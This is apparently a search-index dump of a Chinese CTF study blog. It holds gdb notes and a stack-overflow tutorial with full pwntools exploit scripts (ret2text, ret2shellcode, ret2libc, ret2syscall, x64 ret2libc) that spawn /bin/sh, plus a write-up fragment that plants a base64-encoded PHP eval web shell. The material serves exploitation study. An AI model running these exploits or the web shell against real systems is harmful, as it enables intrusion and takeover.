?&gt;&quot;);\n\n进行编码后为：\nip/?cmd=file_put_contents(base64_decode(&quot;c2hlbGwucGhw&quot;),base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW3hd\n\n\n\nweb 二次编码直接访问/flag.php就可以得到flag.php\nweb sql直接用sqlmap。\n","categories":["WP"],"tags":["WP"]},{"title":"gdb调试","url":"/2025/07/16/%E6%8E%A7%E5%88%B6%E5%91%BD%E4%BB%A4/","content":"TAB：显示所有命令\n\nstart:运行到程序入口处\nrun:运行完整个程序\n🔍 x 命令的基本语法：x&#x2F;nfs  address\n\nn ：要显示的内存单元个数（默认是 1）。\nf ：显示格式（format），比如十六进制、十进制、字符串等。\ns ：内存单元大小（size），比如字节、半字、字等。\naddress ：要查看的内存地址（可以是变量名、寄存器、指针表达式等）。\n\nf：输出格式（format）\n\n\n\n\n\n\n\nx\nHex（十六进制）\n\n\nd\nDecimal（十进制）\n\n\nu\nUnsigned decimal\n\n\no\nOctal（八进制）\n\n\nt\nBinary（二进制）\n\n\nf\nFloating point（浮点数）\n\n\na\nAddress（地址，显示指针）\n\n\ni\nInstruction（反汇编指令）\n\n\nc\nChar（字符）\n\n\ns\nString（字符串）\n\n\ns：内存单元大小（size）\n\n\n\n\n\n\n\n\nb\nbyte（字节）\n1 字节\n\n\nh\nhalfword（半字）\n2 字节\n\n\nw\nword（字）\n4 字节\n\n\ng\ngiant word（双字）\n8 字节\n\n\n🧠 示例用法\n1.查看地址 0x7fffffffe000 处的 4 个 4 字节数值，以十六进制显示：\nx/4wx 0x7fffffffe000\n\n输出\n0x7fffffffe000: 0x00000001  0x00007fff  0x00000000  0x00000000\n\n\n\n\n\n2. 查看地址 0x400500 处的 5 条汇编指令：\nx/5i 0x400500\n\n输出\n0x400500:  push   %rbp0x400501:  mov    %rsp,%rbp0x400504:  sub    $0x10,%rsp0x400508:  mov    %edi,-0x4(%rbp)0x40050b:  mov    %rsi,-0x10(%rbp)\n\n\n\n\n\n3. 查看栈顶指针 rsp 地址的内容（以 8 字节为单位，显示为十六进制）：\nx/gx $rsp\n\n输出\nx/gx $rsp\n\n\n\n\n\n4. 查看地址 0x7fffffffe010 开始的字符串：\nx/s 0x7fffffffe010\n\n输出\n0x7fffffffe010: &quot;Hello, world!&quot;\n\n\n\n\n\n5.查看地址 0x601038 的 10 个字节，以十进制形式显示：\nx/10db 0x601038\n\n输出\n0x601038: 72  101  108  108  111  44  32  119  111  114\n\n\n\n\n\n:small_airplane:接收数据\n\n\n函数\n说明\n\n\n\nrecvall()\n接收所有数据直到 EOF\n\n\nrecvline()\n接收一行（以\\n结尾）\n\n\nrecvuntil(delim)\n接收数据直到遇到指定分隔符（如&quot;Welcome!&quot;）\n\n\nrecvregex(regex)\n接收数据直到匹配正则表达式\n\n\nrecv(n)\n接收指定字节数的数据（阻塞直到收到 n 字节）\n\n\n","categories":["pwn_study"],"tags":["PWN","gdb"]},{"title":"初识栈溢出","url":"/2025/07/05/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/","content":"\nfun(a,b)调用过程入栈\n（1）压入参数 \n根据调用约定，main函数作为调用者，首先需要将func函数的两个参数a,b压入栈中。\n注意压入参数的顺序，首先压入b，接着压入a，也就是说，压入参数的顺序是从右到左。\n（2）返回地址压栈\n返回地址压栈。main函数为了让func函数调用后正常返回，需要将当前指令（call指令）的下一条指令的地址压入栈中\ncall指令包含两个步骤：main函数的下一条指令压栈；控制eip为func函数的第一条语句，eip存储着CPU将要执行的指令的地址\n（3）func函数运行\nfunc函数需要自己的内部运作空间。可以使用以下指令序列开辟空间：push ebp   mov ebp,esp  sub esp,28h\n这个28h就是开辟的存储func函数的相关内存的空间\n\nmov ebp,esp看似没有变化，但EBP 从“保存调用者基址”变为“当前函数的栈帧基址”。\n（4）func函数的局部变量和参数\nfunc函数有自己内部的运作空间，即func_ebp到func_esp\n局部变量在编译之后会被表示为与ebp 不同的距离\n\nv2被表示为ebp -18h，v3被表示为ebp -10h。\n注意，这里的v2, v3和v4都是局部变量。参数的读取方式例子:第一个参数是ebp+8，第二个参数是ebp+12\n因为调用约定，肯定有main_next和main_ebp在ebp的上方，故偏移是固定的，在返回地址main_next上面\n然后，func函数返回。两个步骤：清除栈空间，返回到之前执行的指令（main_next）处。\n(5)func函数返回步骤1:清除栈空间\n每个函数清除栈空间时可以使用一条公用指令leave。\nleave包含两个步骤：\n①mov esp,ebp将栈顶设置为栈基，即将func_ebp到func_esp的内容全部出栈；\n②pop ebp 将main_ebp的内容重新弹回ebp，使main函数的栈基址得到恢复\n(6)func函数返回步骤2：返回之前执行的指令（main_next）处\n每个函数返回时可以使用一条公用指令ret。ret包含一个步骤：将栈顶弹出到eip寄存器（即下一条指令的位置），达到恢复main函数执行顺序的\n目的。\n到这里，main函数的栈基址和下一条指令都得到了恢复，也就完成了整个func函数的调用。\n\nLinux操作系统的保护\n Arch:amd64-64-little：\namd64即x86_64(CPU架构)                 \n64即字长为64，返回地址在栈中占 8字节，32位是4字节）\nlittle表示小端序，如果是big则表示大端序。以数字0x12345678为例，小端序存储的是\\x78\\x56\\x34\\x12，大端序存储的是\\x12\\x34\\x56\\x78\nRELRO：Partial RELRO:\nPartial RELRO和Full RELRO的区别可以简单理解为GOT写权限的区别，Partial RELRO相当于GOT可写，Full RELRO相当于GOT不可写。\nNX：NX enabled:\n如果开启了NX保护机制，那么w权限和x权限就是互斥的,即不存在既拥有写权限又拥有执行权限的段。这个保护机制是用来防止shellcode植入的。在gdb调试中，可以通过vmmap命令来查看每个段的权限。\nPIE：No PIE（0x8048000）\nret2text(覆盖返回地址)该函数内存在get漏洞\n\n该函数泄露了后门函数\n接着通过gets函数栈溢出将这个地址改为target，那么vulnfunc返回的时候，用ret指令取出栈顶的元素返回，就会返回到target这个函数\ntarget函数中有system（”&#x2F;bin&#x2F;sh”）这个后门，类似于在Linux的终端直接调用&#x2F;bin&#x2F;sh。利用这种方式可以直接返回一个shell，进而得到目标主机的shell，拿到控制权。\n找填充字节\n直接从IDA中读出长度\n\ns到vulnfunc的ebp的距离是108h，所以到main_next的距离是0x108+4\n那个4是32位的ebp的空间\n脚本from pwn import *p = process(&quot;./ret2text&quot;)p.recvuntil(&quot;ret2text\\n&quot;)payload = b&#x27;a&#x27;* (0x108+4) + p32(0x0804850B)p.sendline(payload)p.interactive()\n\nret2shellcode（覆盖返回地址到Shellcode）Shellcode是机器码格式的恶意代码，指的是用于完成某个功能的汇编代码，常用的功能是获取目标系统的shell。在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行Shellcode，就要求对应的二进制文件没有开启NX保护\n\n printf(&quot;%p\\n&quot;, s)输出了S的缓冲区的位置\n\n没有开启NX保护\n所以可以向进程中写入一段Shellcode（利用w写权限），再执行这段Shellcode（利用x执行权限）。\n脚本from pwn import *context.arch = &quot;i386&quot;p = process(&quot;./ret2shellcode&quot;)#gdb.attach(p,&quot;b *0x08048593&quot;)p.recvuntil(b&quot;ret2shellcode\\n&quot;) # 修改为字节串target = int(p.recvuntil(b&quot;\\n&quot;,drop = True),16) # 修改为字节串sc = asm(shellcraft.sh())payload = sc+b&#x27;a&#x27; * (0x108 + 4-len(sc))+ p32(target) p.sendline(payload)p.interactive()\n\ncontext.arch = &quot;i386&quot;说明程序的架构，使用 asm() 函数将 shellcode (shellcraft.sh()) 汇编成机器码时，pwntools 需要知道目标架构是 32 位还是 64 位，以便生成正确的指令集。32 位和 64 位的指令是不同的。\ntarget = int(p.recvuntil(b&quot;\\n&quot;,drop = True),16) 接收知道读取到&#x2F;n，(输出的缓冲区的地址)，转化为十六进制整数，且drop = True方便地清理你接收到的数据。只提取某个模式（比如一个地址、一个数字或一个特定的字符串）而不包含用于分隔或终止的字符（如换行符、空格、冒号等）\nsc = asm(shellcraft.sh())生成启动/bin/sh的机器码\npayload = sc+b&#39;a&#39; * (0x108 + 4-len(sc))+ p32(target) 从右到左入栈，p32(target):覆盖返回地址，b’a’ * (0x108 + 4 - len(sc)):填充从sc结束位置到返回地址之间所有“无用”的栈空间。sc:当 sc位于缓冲区的起始位置。\ncontext(arch &#x3D; ‘amd64’, os &#x3D; ‘linux’, log_level &#x3D; ‘debug’)\n这种context的信息可以通过指令file+文件名 得到\n输出示例：\nmrctf2020_shellcode: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, …\n\n这里关键的信息：\n\nELF → 说明是 Linux\n64-bit → 说明是 64 位\nx86-64 → 架构就是 amd64（pwntools 里写 amd64）\n\n如果输出是：\nELF 32-bit LSB executable, Intel 80386\n\n那你就用：\ncontext(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)\n\n如果是：\nELF 32-bit LSB executable, ARM\n\n那你就用：\ncontext(arch=&#x27;arm&#x27;, os=&#x27;linux&#x27;)\n\n\n\n\n\n\n\n\n\nropNX 保护 (No-Execute): 它的唯一目的是阻止你在数据区域（比如栈和堆）执行代码。你可以把栈和堆想象成一块“只写数据，不能跑程序”的区域。\n\n允许什么？ 允许你在栈上写数据（比如填充字符串 AAAA，或者一些地址）。 允许你修改寄存器的值。 允许你覆盖返回地址。\n阻止什么？ 阻止你把自己的汇编代码（我们称之为 Shellcode）放在栈上，然后让程序去执行它。\n\nret2libc1（单个函数的rop来链）第一步，先看保护\n\n\nget溢出\n\nsystem函数存在,但参数不是&#x2F;bin&#x2F;sh\n\nsystem函数存在,并且程序中心存在bin&#x2F;sh字符串\n所以可以把bin&#x2F;sh作为参数传入system函数中构造后门函数\n要构造一个后门函数，先调用system函数，然后按照调用流程，参数（bin&#x2F;sh字符串所在的位置）入栈，返回地址入栈\npayload的形式是**[垃圾填充] + [system函数地址] + [system返回地址] + [binsh字符串地址]**\n脚本from pwn import *context.arch = &quot;i386&quot; # 强烈建议加上这一行p = process(&quot;./ret2libc1&quot;)#gdb.attach(p,&quot;b *0x08048595&quot;) # 调试时启用#elf = ELF(&quot;./ret2libc1&quot;)#system = elf.plt[&quot;system&quot;]binsh = 0x0804A028 # 确保这个地址确实包含 &quot;/bin/sh&quot; 字符串p.recvuntil(b&quot;ret2libc1\\n&quot;) payload = b&#x27;a&#x27; * (0x108 + 4)+ p32(0x080483D0)+p32(0)+p32(0x804A028)p.sendline(payload)p.interactive()\n\n找到system函数位置\nelf = ELF(&quot;./ret2libc1&quot;)        system = elf.plt[&quot;system&quot;]直接找到systemd的入口\n注意\n[system返回地址] 不能乱写，后门函数执行结束后会返回这个地址，错误的地址会引发崩溃\n1.elf.plt[&quot;exit&quot;] (最常用，推荐)：\n\n作用：让 system(&quot;/bin/sh&quot;) 执行完毕后，程序能够干净地调用 exit() 函数并退出。这是最推荐的做法，因为它确保了程序的正常终止。\n优点：稳定、可靠，不会导致崩溃。\n获取方式：elf.plt[&quot;exit&quot;] (pwntools 会自动解析)。\n\n2.0x0 或其他无效地址 (导致崩溃)：\n\n作用：如果你只关心 system(&quot;/bin/sh&quot;) 是否被执行，而不关心程序是否崩溃，那么可以随便填。\n优点：最简单。\n缺点：程序会崩溃，这在实际攻防中通常是不希望看到的。有时调试时为了快速验证 system 是否被调用，可能会暂时使用。\n\nret2libc2(两个函数的rop链)\n该题没有bin&#x2F;sh字符串\n\n所以我们要自己去通过get构造\n(1)func函数通过栈溢出修改返回地址为gets_addr,传入get()的参数，b作为get函数底色参数，即其从终端读取的数据要存入的地方\n（)\n（2）get函数被调用后会为自己开辟空间，执行时再次通过栈溢出填入system函数的地址和参数，最后调用system执行构造好的后门函数\n\n分析之后得到应该构造如下形式的payload\n\n其中get()函数和sys函数的参数都是bss段，get()用来把bin&#x2F;sh写入bss段，sys和它构成后门函数\nget写入bss段的内容需要从终端读取，所以之后还要为其发送一个“bin&#x2F;sh”\nPayload的形式是p32（gets_addr）+p32（system_addr）+p32（gets_p1）+p32（system_p1）。\n开启了NX保护，写和运行不能同时实现，所以改变该函数的参数位置，所以把 /bin/sh）写入一个可写的内存区域。.bss 段是一个非常理想的选择，因为它：\n\n可写 \n\n通常位于固定的地址（特别是在 没有开启 ASLR 的情况下）；\n\n在程序运行期间未初始化的数据都存储在这里。\n找bss地址\n1.readelf\nreadelf -S ret2libc2\n\n2.gdb调试\ngdb ./ret2libc2    info files\n\n显示了bss段的始末位置\n3.脚本中直接得到\nelf.bss()\n\n脚本from pwn import *p = process(&quot;./ret2libc2&quot;)gdb.attach(p,&quot;b *0x08048595&quot;)elf=ELF(&quot;./ret2libc2&quot;)sys=elf.plt[&quot;system&quot;]get=elf.plt[&quot;gets&quot;]bss=elf.bss()payload=b&#x27;a&#x27;*(0x108+4)payload+=p32(get)+p32(sys)+p32(bss)+p32(bss)p.sendline(payload)p.sendline(&quot;/bin/sh&quot;)p.interactive()\n\ngdb调试检查是否成功写入\nc一下运行到下断点位置\n\n\n这个时候第一个get已经实现，payload已经传入了\n\n下一步会进入我们传进去的get中\n\nget 和system函数都执行结束后\nx/s 0x0804a040发现bss内存入了bin&#x2F;sh\nret2libc2(多个函数的rop链)假设一个二进制文件里仅有read函数，read函数有三个参数（fd，addr和length）\n这是按照两个rop链写出的payload填补形式\n\n函数read因为拥有三个参数，所以相应地在栈上需要有三个块的空间。这时，system函数的第一个参数的位置就会和read函数的第二个参数的位置冲突，导致无法将system函数的第一个参数放置在栈上。不方便直接覆盖，因为read的参数限制比较多\n所以这种情况就可以用pop&#x2F;ret进行\n\n注意选取的基本原则：有几个参数就用几个pop指令，比如调用完gets函数之后，因为gets函数只有一个参数，所有可以将gets函数的返回地址改为0x0804862F，即只执行一个pop指令弹出参数之后就是ret指令；比如read函数有三个参数，那么就找0x0804862D这个位置，因为这个位置的指令是3个pop指令加上一个ret指令\n如何寻找若干个pop指令跟着ret指令\nROPgadget --binary ret2libc2 --only &quot;pop|ret&quot;\n(ROPgadget用于查找用来攻击的可执行代码片段，而readlf是程序的整体结构和内存布局)\n\n脚本from pwn import *p = process(&quot;./ret2libc2&quot;)#gdb.attach(p,&quot;b *0x8048595&quot;)elf=ELF(&quot;./ret2libc2&quot;)sys=elf.plt[&quot;system&quot;]get=elf.plt[&quot;gets&quot;]bss=elf.bss()pop1_ret=0x804861bpayload=b&#x27;a&#x27;*(0x108+4)payload+=p32(get)+p32(pop1_ret)+p32(bss)payload+=p32(sys)+p32(pop1_ret)+p32(bss)p.sendline(payload)p.sendline(&quot;/bin/sh&quot;)p.interactive()\n\npayload += p32(get) + p32(pop1_ret) + p32(bss):\n盘子比喻\n\n准备 ROP 链（堆叠盘子）： 你在内存的栈上，从下往上（也就是从低地址往高地址，因为栈是向下增长的），像堆叠盘子一样放了一系列地址。 假设你的 ROP 链片段是：A (get地址), B (pop ebp; ret地址), C (bss地址)。\n栈上的盘子：\n... (其他数据)[ C 盘子 (bss地址) ]  &lt;-- 位于栈上较高位置[ B 盘子 (pop ebp; ret地址) ][ A 盘子 (get地址) ]  &lt;-- 位于栈上较低位置，最先被程序“看到”\n\n当程序返回时，会先“拿起”最上面的盘子（A）。\n\n执行 get 函数（使用 A 盘子）：\n\n程序因为栈溢出被劫持，它会跳到 get 函数的地址（A 盘）。\nget 函数开始执行。它需要一个参数，也就是一个内存地址来存放它读取的数据。\nget 函数会去“看”它自己返回地址上方的“盘子”，也就是 C 盘子 (bss地址)。\n所以，C 盘子 (bss地址) 被 get 函数当作了它的参数，get 会将你通过 p.sendline(&quot;/bin/sh&quot;) 发送的数据写入到 C 盘子 所指示的内存区域（即 bss 段）。\nget 函数执行完毕后，它需要“返回”。它会从栈上取回它的返回地址，也就是紧邻其下的 B 盘子 (pop ebp; ret地址)。\n\n\n执行 pop ebp; ret gadget（使用 B 盘子）：\n\n程序跳转到 B 盘子 (pop ebp; ret地址)。\n现在，B 盘子 内部的指令开始执行：\npop ebp： 这条指令会“拿起”栈顶的那个盘子。此时栈顶就是 C 盘子 (bss地址)。所以，C 盘子 (bss地址) 会被弹出并放入 ebp 寄存器。这个操作相当于把 C 盘子 从栈中拿走了。\nret： 这条指令会“拿起”栈中现在最上面的盘子（也就是 C 盘子 被拿走后暴露出的下一个盘子），并跳转到那个盘子上的地址。这个盘子就是你 ROP 链中的下一个函数地址（例如 sys 函数的地址）。\n\n\n\n\n\nret2syscall(底层系统调用静态)\n\n开启了NX保护，但我们可以通过精心构造ROP链实现跳转，而不改变数据段的数值\n除此之外没有上面有效的东西了,整个二进制文件中都没有system函数\n所以自己为寄存器赋值以构造后门函数。且调用的int 0x80要放在最上面，调用时，从下往上开始执行，执行到调用指令时，该函数的参数必须准备好、\n根据命令找到&#x2F;bin&#x2F;sh字符段 和int 0x80的调用命令以及需要的pop|ret命令\n\n脚本from pwn import *p = process(&quot;./ret2syscall&quot;)#gdb.attach(p,&quot;b *0x080488ED&quot;)binsh=0x080ea068int_0x80=0x0806ce55pop_eax_ret = 0x080b8526pop_edx_ecx_ebx_ret = 0x0806f200eax = 11 # #define __NR_ execve 11ebx = binshecx = 0edx = 0payload=b&#x27;a&#x27;*(0x108+4)payload+=p32(pop_eax_ret)+p32(eax)payload+=p32(pop_edx_ecx_ebx_ret)+p32(edx)+p32(ecx)+p32(ebx)payload+=p32(int_0x80)p.sendline(payload)p.interactive()\n\n\n\n编译知识（1）静态编译。编译器在编译可执行文件的时候，会提取可执行文件需要调用的对应的动态链接库（.so）中的部分，并链接到可执行文件中\n去，使可执行文件在运行的时候不依赖于动态链接库。\n（2）动态编译。动态编译的可执行文件需要附带一个动态链接库，在执行时，需要调用其对应动态链接库中的命令。所以，其优点一方面是\n缩小了可执行文件的大小，优点加快了编译速度，节省了系统资源。缺点一方面是哪怕很简单的程序，只要用到了链接库中的一两条命令，也要附带一个庞大的链接库；另一方面是如果其他计算机上没有安装对应的运行库，则经过动态编译的可执行文件就不能运行。\n静态编译的优缺点与动态编译正好相反。\n静态编译可以简单理解为将动态链接库中的代码拷贝出来放入对应的二进制文件里。\n寄存器\n在32位系统中，通过int 0x80指令触发系统调用。其中，EAX寄存器用于传递系统调用号，参数按顺序赋值给EBX、ECX、EDX、ESI、\nEDI、EBP这6个寄存器。\n在64位系统中，使用syscall指令来触发系统调用，同样使用EAX（RAX）寄存器传递系统调用号，RDI、RSI、RDX、RCX、R8、R9\n这6个寄存器用来传递参数。\n\neg:read（0,buf,0x100）\n32位时，eax&#x3D;3（#define__NR_read 3）;ebx&#x3D;0;ecx&#x3D;buf;edx&#x3D;0x100;，设置完每个寄存器的值之后，再执行int 0x80指令，就会执行对应的read（0,buf,0x100）。实际上，最后还会进入内核态执行。\n64位时，rax&#x3D;0（#define__NR_read 0）;rdi&#x3D;0;rsi&#x3D;buf;rdx&#x3D;0x100，设置完每个寄存器的值之后，再执行syscall指令，就会执行对应的read（0,buf,0x100）。\n也是进入内核态执行。\n如果想要完成Get shell\n32位时，：eax&#x3D;11（#define__NR_execve 11）;ebx&#x3D;”&#x2F;bin&#x2F;sh”;ecx&#x3D;0;edx&#x3D;0;（NULL实际上就是0），设置完每个寄存器的值之后，再执行int 0x80指令，就会执行对应的execve（”&#x2F;bin&#x2F;sh”,NULL,NULL）。\n64位时，rax&#x3D;59（#define__NR_execve 59）;rdi&#x3D;”&#x2F;bin&#x2F;sh”;rsi&#x3D;0;rdx&#x3D;0;\n\n在ida中红色为外部函数，白色为内部函数\n静态编译的二进制文件全为内部函数\nret2libc3\n脚本from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3&quot;)#gdb.attach(p, &quot;b *0x0804854C&quot;)elf = ELF(&quot;./ret2libc3&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]main_addr = 0x0804854E# 泄露 gets 地址p.recvuntil(&quot;ret2libc3\\n&quot;)payload1  = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)p.sendline(payload1)# 获取泄露地址leak_addr = u32(p.recv(4))# 用 LibcSearcher 查libc = LibcSearcher(&quot;gets&quot;, leak_addr)#LibcSearcher 会根据你提供的函数名和地址，去匹配已知的 libc 数据库libc_base = leak_addr - libc.dump(&quot;gets&quot;)#libc.dump(&quot;gets&quot;)是gets 函数在 libc 中的偏移（相对于 libc 基地址）system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr  = libc_base + libc.dump(&quot;str_bin_sh&quot;)log.success(&quot;libc_base: &quot; + hex(libc_base))log.success(&quot;system: &quot; + hex(system_addr))log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))#输出这个计算出的地址，便于检查# 第二次攻击p.recvuntil(&quot;ret2libc3\\n&quot;)payload2  = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)p.sendline(payload2)p.interactive()\n\n\n\npayload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)\n调用put函数泄露gets函数的实际地址，并且返回main函数，再次利用got漏洞\n它内部使用的是 预定义符号名 ，比如：\n\n&quot;system&quot;\n&quot;gets&quot;\n&quot;printf&quot;\n&quot;str_bin_sh&quot; （就是你要找的 /bin/sh）\n\n这些名字不是随便写的，是预先在 libc 数据库中定义好的符号名称。\n脚本执行后会显示\n\n这是因为用libc &#x3D; LibcSearcher(“gets”, leak_addr)进行选择适合的libc库，但不同版本的libc.so文件的变化不大，一个函数的地址约束不够严格，所以会显示多个libc版本供选择\n解决多个libc.so版本供选择1.多个约束条件\n哪些符号最稳妥\n这是个很重要的问题：\n\n为什么泄露 gets &#x2F; puts &#x2F; printf，不泄露 malloc &#x2F; exit &#x2F; system 呢？\n\n理由：\n\n\n\n符号\n稳妥程度\n原因\n\n\n\nputs\n👍\n几乎每个 libc 里都有，偏移独特\n\n\nprintf\n👍\n常见，偏移独特\n\n\ngets\n👍（但是 glibc2.28+ 被废弃了）\n\n\n\nread\n👍\n核心 IO，存在且稳定\n\n\nwrite\n👍\n和 read 对应\n\n\nsystem\n👎\n很常用，但是有的 libc 把它静态链接了或者位置很常见\n\n\nexit\n👎\n偏移较小且常见，不建议用\n\n\n__libc_start_main\n👍\n非常稳妥，通常不会冲突\n\n\n因此建议你泄露的优先级是：\nputs &gt; printf &gt; read &gt; write &gt; __libc_start_main &gt; gets\n\n理想状态下，你一次性泄露三个符号，比如：\nputs(gets@got);puts(puts@got);puts(printf@got);\n\n然后用三个符号去查库，几乎100%唯一\n但是\n当程序编译时，只有真正被调用的外部库函数才会被链接，并且它们才会在 GOT 表里有条目。\n而你的目标程序 ./ret2libc3 里：\nbash复制编辑gets, puts 有用到printf 没用到\n\n所以：只能有两个约束条件\ncss复制编辑elf.got[&quot;gets&quot;] ✅ 存在elf.got[&quot;puts&quot;] ✅ 存在elf.got[&quot;printf&quot;] ❌ 报错\n\n脚本\nfrom pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3&quot;)elf = ELF(&quot;./ret2libc3&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]#puts的got表main_addr = 0x0804854Ep.recvuntil(&quot;ret2libc3\\n&quot;)payload1  = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)payload1 += p32(puts_plt) + p32(main_addr) + p32(puts_got)#输出puts的实际位置p.sendline(payload1)leak_addr = u32(p.recv(4))leak_puts = u32(p.recv(4))#接收其位置libc = LibcSearcher(&quot;gets&quot;, leak_addr)libc.add_condition(&quot;puts&quot;, leak_puts)#增加puts的位置作为约束条件libc_base = leak_addr - libc.dump(&quot;gets&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr  = libc_base + libc.dump(&quot;str_bin_sh&quot;)log.success(&quot;libc_base: &quot; + hex(libc_base))log.success(&quot;system: &quot; + hex(system_addr))log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))p.recvuntil(&quot;ret2libc3\\n&quot;)payload2  = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)p.sendline(payload2)p.interactive()\n\n但是这个我尝试过对这个题目来说还是约束条件太少，但是由于这个题目调用函数比较少，所以可以作为约束的函数也比较少\n1）GOT。GOT是全局偏移量表（Global Offset Table），用于存储外部函数在内存中的确切地址。GOT存储在数据段（Data Segment）内，可以在程序运行过程中被修改。\n2）PLT是程序链接表（Procedure Linkage Table），用来存储外部函数的入口点（entry），换言之，程序会到PLT中寻找外部函数的地址。PLT存储在代码段（Code Segment）内，在运行之前就已经确定并且不会被修改。\n简单来讲，GOT是个数据表，存储的是外部函数的地址，具有读写权限（在FULL RELRO保护机制开启的时候，没有读写权限）；PLT是外部函数的入口表，存储的是每个外部函数的代码，具有执行权限。\n尽管 libc 的加载地址是随机的（ASLR），但在libc不同的情况下 libc 内部所有函数相对于 libc 基地址的偏移量是固定不变的。这是 ret2libc 攻击的基础。\n实际地址&#x3D;基址+偏移\n当你写了一个程序使用了 libc 中的函数（如 printf），这个函数的具体地址在编译时是未知的，因为 libc 被加载的位置会因 ASLR（地址空间布局随机化）而变化。\n\n\n\n函数名称\n内容\n\n\n\nPLT\n提供跳转桩代码\n\n\nGOT\n存放实际函数地址\n\n\n当你的程序调用 printf() 时，实际上调用的是 PLT 中的 printf@plt，PLT 再通过 GOT 查找真正的地址。\n🔁 总结对比（重点来了！）\n\n\n\n\n\n\n\n为什么可以用 system@plt？\n因为它是 libc 中system()函数的“入口大门”，进去以后就会自动跳过去，不用你自己去找路。\n\n\n为什么不用 GOT？\n因为我们不是要读取地址，而是要调用函数。PLT 就像按钮，按下去就能运行函数，不需要先看地址。\n\n\n什么时候必须用 GOT？\n当你在远程服务器上不知道 libc 版本和地址时，必须先通过 GOT 泄露一个函数地址，才能计算出其他函数的地址。\n\n\n什么时候能直接用 PLT？\n当你在本地调试、libc 是固定的，而且程序没开 PIE（地址不随机化）的时候，就可以直接调用 PLT。\n\n\nret2libc3 可以用 ret2syscall 的方法来攻击，只需要找到特定的、固定的 ROP gadgets 和 int 0x80 指令。\n选择 ret2libc 的方法，通常是因为 system() 函数提供的便捷性更高，虽然多了一步 libc 泄露的开销，但在大多数情况下，这种方法更“简单”且更“通用”。\n在实际的 CTF 比赛中，攻击者会根据目标程序的具体情况（是否有易于利用的 int 0x80、是否有足够的 gadgets、是否有 &quot;/bin/sh&quot; 字符串等）来选择最简单、最可靠的攻击方法。\nret2libc3 之所以需要泄露 libc 地址，是因为它依赖于调用 libc 库中（而非程序自身）的封装函数（如 system()），而这些 libc 函数的地址会受到 ASLR (地址空间布局随机化) 的影响而随机化。ret2syscall 能够不泄露 libc 地址，是因为它依赖于程序自身或加载到固定地址的共享库中的 ROP gadget 和 int 0x80 指令，这些地址在没有 PIE (位置无关可执行文件) 的情况下是固定的。\nret2libc3_x6432位程序的payload都是在返回地址之后加上参数，而64位是在返回地址之前把参数放入寄存器中\n64位程序和32位程序的ROP技术的不同点在于参数传递的方式不同。64位程序的前6个参数是rdi,rsi,rdx,rcx,r8,r9，后续参数才会放在栈上，所以64位程序的ROP和ret2syscall几乎是一样的，都是先控制寄存器，再跳转到对应的函数进行操作。\n脚本from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3_x64&quot;)#gdb.attach(p,&quot;b *0x00000000004006F1&quot;)elf = ELF(&quot;./ret2libc3_x64&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]main_addr = elf.symbols[&quot;main&quot;]rdi = 0x0000000000400783 # pop rdi ; retret_gadget = 0x0000000000400784 # Assuming this is a &#x27;ret&#x27; instruction for stack alignmentp.recvuntil(b&quot;ret2libc3_x64\\n&quot;)payload1 = b&quot;a&quot; * (0x108)payload1 += p64(rdi) + p64(gets_got)payload1 +=p64(puts_plt)+p64(main_addr)p.sendline(payload1)leak_addr = u64(p.recv(6).ljust(8, b&quot;\\x00&quot;))libc = LibcSearcher(&quot;gets&quot;, leak_addr)libc_base = leak_addr - libc.dump(&quot;gets&quot;)#libc.address = libc_base#我感觉没什么用log.success(&quot;libc_base:&quot; + hex(libc_base))system = libc_base + libc.dump(&quot;system&quot;)binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)# ====== 修改开始：添加 GDB 动态下断点 ======gdb.attach(p, f&#x27;b *&#123;hex(system)&#125;&#x27;)  # 在 system 地址处下断点# ====== 修改结束 ======p.recvuntil(b&quot;ret2libc3_x64\\n&quot;)payload2 = b&quot;a&quot; * (0x108)payload2 += p64(rdi) + p64(binsh)payload2 += p64(ret_gadget)payload2 += p64(system)p.sendline(payload2)p.interactive()\n\n\n\n对于payload2由于考虑堆栈平衡，所以会有两个ret指令放在一起\npayload2 +&#x3D; p64(rdi) + p64(binsh)payload2 +&#x3D; p64(ret_gadget)\n堆栈平衡64位程序中，函数调用前，栈指针（rsp）必须是 16 字节对齐的 \n32位程序中，函数调用前后，栈指针 esp 的值应该保持不变（32位一般不考虑堆栈平衡）\n✅ 一、静态分析：计算栈偏移\n为了栈对齐（避免崩溃），你构造的 payload 中“除了填充部分”之外的内容（即 gadget 和参数）最好是一个偶数块（8 字节为一块）\n✅ 二、动态调试：使用 GDB 查看 rsp 的值\n对于这一题来说，在确定了libc.so库和libc基址之后，在system函数内在system处设置断点\n之后运行这个脚本\n\n这里就选择好libc版本了\n之后动态调试查看\n\n在刚进入这个函数的第一步，就已经处于不平衡的状态了\n因为它在调用前是栈平衡，调用时会有push rsp 指令改变\n查看栈顶的命令是\ninfo register rsp\n\n\n\n\n\n注意对于构造的rop链\n填充返回地址\n\n\n填充的返回地址\n效果\n\n\n\nmain()\n让程序重新运行 main 函数（可重复利用）\n\n\n_start\n重新开始整个程序\n\n\nshellcode 